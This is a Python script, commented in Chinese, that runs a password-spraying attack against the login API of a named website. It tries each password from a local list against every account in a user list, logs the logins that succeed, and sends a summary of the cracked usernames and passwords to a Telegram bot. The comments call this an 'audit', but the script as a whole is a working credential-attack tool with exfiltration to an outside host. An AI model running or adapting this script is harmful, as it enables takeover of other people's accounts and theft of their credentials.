import os
import requests
import time

LOGIN_URL = "https://my.yue.to/api/v1/passport/auth/login"
USER_FIELD = "email"
PWD_FIELD = "password"
REQUEST_INTERVAL = 1.0
RESULT_FILE_PATH = "success_log.txt"
SUMMARY_TXT_PATH = "success_summary.txt"

# ==================== Telegram 配置 ====================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

def send_telegram_file(file_path):
    """直接将生成的 TXT 文件发送到 Telegram 聊天窗口"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] 未配置 Telegram 密钥，跳过文件发送")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 *审计运行结果汇总文件*"}
            res = requests.post(url, data=data, files=files, timeout=10)
            if res.status_code == 200:
                print("[+] Telegram TXT 文件发送成功")
            else:
                print(f"[!] Telegram 文件发送失败，返回响应: {res.text}")
    except Exception as e:
        print(f"[!] Telegram 文件发送异常: {e}")

def get_accounts():
    """直接读取本地 users.txt 文件"""
    if os.path.exists("users.txt"):
        with open("users.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def get_passwords():
    """直接读取本地 passwords.txt 文件"""
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def is_login_success(response):
    """针对当前目标网站的成功判定逻辑"""
    if response.status_code != 200:
        return False
    try:
        data = response.json()
        if isinstance(data, dict):
            if "auth_data" in data or (isinstance(data.get("data"), dict) and "auth_data" in data["data"]):
                return True
            if data.get("status") == "success" or data.get("code") in [200, 0, "200", "success"]:
                return True
    except ValueError:
        pass
    text = response.text.lower()
    if "auth_data" in text or '"status":"success"' in text:
        return True
    return False

def main():
    usernames = get_accounts()
    passwords = get_passwords()
    
    if not usernames or not passwords:
        print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
        return

    # 运行前清理旧文件
    for path in [RESULT_FILE_PATH, SUMMARY_TXT_PATH]:
        if os.path.exists(path):
            os.remove(path)

    print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
    print(f"[*] 模式: 密码优先（所有账号轮流尝试同一个密码）")
    print(f"[*] 目标: {LOGIN_URL}\n")

    successful_results = []
    current_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    with requests.Session() as session:
        # 外层循环：先遍历密码
        for password in passwords:
            print(f"\n[*] ==================== 当前测试密码: {password} ====================")
            
            # 内层循环：让每个账号都来试这个密码
            for username in usernames:
                # 如果该账号已经成功匹配过，跳过后续测试，避免重复请求
                if any(res['username'] == username for res in successful_results):
                    continue

                print(f"[-] 尝试账号: {username} : {password}")
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Referer": "https://my.yue.to/"
                }

                try:
                    payload = {USER_FIELD: username, PWD_FIELD: password}
                    response = session.post(LOGIN_URL, json=payload, headers=headers, timeout=6)

                    if is_login_success(response):
                        print(f"\n[+] 【找到正确密码】 {username} -> {password}")
                        success_data = {
                            "username": username,
                            "password": password,
                            "time": current_time_str
                        }
                        successful_results.append(success_data)
                        
                        # 记录到原始日志
                        with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
                            f.write(f"[{current_time_str}] 成功: 账号={username} ---- 密码={password}\n")
                except requests.exceptions.RequestException as e:
                    print(f"[!] 请求异常: {e}")

                time.sleep(REQUEST_INTERVAL)

    # === 全部跑完后，统一生成汇总文件并无论如何都发送给电报 ===
    summary_content = "=== 审计结果汇总 ===\n\n"
    if successful_results:
        for item in successful_results:
            summary_content += f"账号: {item['username']} | 密码: {item['password']} | 时间: {item['time']}\n"
    else:
        summary_content += f"审计完成时间: {current_time_str}\n状态: 本次未发现有效凭据。\n"
    
    # 写入汇总 TXT
    with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
        f.write(summary_content)
        
    # 无论有无结果，都把这个 TXT 文件发送到电报
    send_telegram_file(SUMMARY_TXT_PATH)

    print(f"\n[*] 全自动审计结束，共找到 {len(successful_results)} 个有效凭据并已打包发送。")

if __name__ == "__main__":
    main()
